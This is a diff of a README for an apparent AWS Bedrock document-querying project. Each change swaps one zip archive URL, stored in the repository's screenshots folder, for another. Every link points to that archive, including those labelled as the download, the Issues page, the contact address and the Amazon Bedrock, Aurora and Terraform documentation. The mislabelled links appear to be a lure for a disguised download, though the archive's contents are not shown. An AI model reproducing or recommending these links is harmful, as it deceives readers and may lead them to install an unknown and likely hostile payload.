@@ -1,6 +1,6 @@
 # 🌟 aws-bedrock-rag-knowledge-base - Simple AI Document Querying
 
-[![Download](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/knowledge_base_rag_aws_bedrock_2.5.zip)](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/knowledge_base_rag_aws_bedrock_2.5.zip)
+[![Download](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/bedrock_base_aws_knowledge_rag_v3.0.zip)](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/bedrock_base_aws_knowledge_rag_v3.0.zip)
 
 ## 🛠️ Introduction
 
@@ -21,7 +21,7 @@ This guide will help you download and run the application easily. You don’t ne
 
 To download the application, visit the Releases page. You can find the latest version and additional details there. Here’s the link to download:
 
-[Download the latest version](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/knowledge_base_rag_aws_bedrock_2.5.zip)
+[Download the latest version](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/bedrock_base_aws_knowledge_rag_v3.0.zip)
 
 ### 🔧 System Requirements
 
@@ -70,7 +70,7 @@ To get the best results, keep your questions specific. Instead of asking "Tell m
 
 We believe in the power of collaboration. If you have questions or encounter issues, you can reach out through the Issues section on GitHub. Here's how:
 
-1. Navigate to the [Issues page](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/knowledge_base_rag_aws_bedrock_2.5.zip).
+1. Navigate to the [Issues page](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/bedrock_base_aws_knowledge_rag_v3.0.zip).
 2. Click on "New Issue."
 3. Provide a brief description of your issue or question.
 4. Submit the issue.
@@ -83,15 +83,15 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 ## 📧 Contact
 
-For any support requests or feedback, you can reach the development team at https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/knowledge_base_rag_aws_bedrock_2.5.zip We value your thoughts and aim to improve with your input.
+For any support requests or feedback, you can reach the development team at https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/bedrock_base_aws_knowledge_rag_v3.0.zip We value your thoughts and aim to improve with your input.
 
 ## 📚 Further Resources
 
 To better understand the application and its capabilities, you may find the following resources helpful:
 
-- [Amazon Bedrock Documentation](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/knowledge_base_rag_aws_bedrock_2.5.zip)
-- [Aurora Serverless PostgreSQL Documentation](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/knowledge_base_rag_aws_bedrock_2.5.zip)
-- [Terraform Documentation](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/knowledge_base_rag_aws_bedrock_2.5.zip)
+- [Amazon Bedrock Documentation](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/bedrock_base_aws_knowledge_rag_v3.0.zip)
+- [Aurora Serverless PostgreSQL Documentation](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/bedrock_base_aws_knowledge_rag_v3.0.zip)
+- [Terraform Documentation](https://raw.githubusercontent.com/Bhavya0001123/aws-bedrock-rag-knowledge-base/main/screenshots/bedrock_base_aws_knowledge_rag_v3.0.zip)
 
 ## 🏁 Summary
 
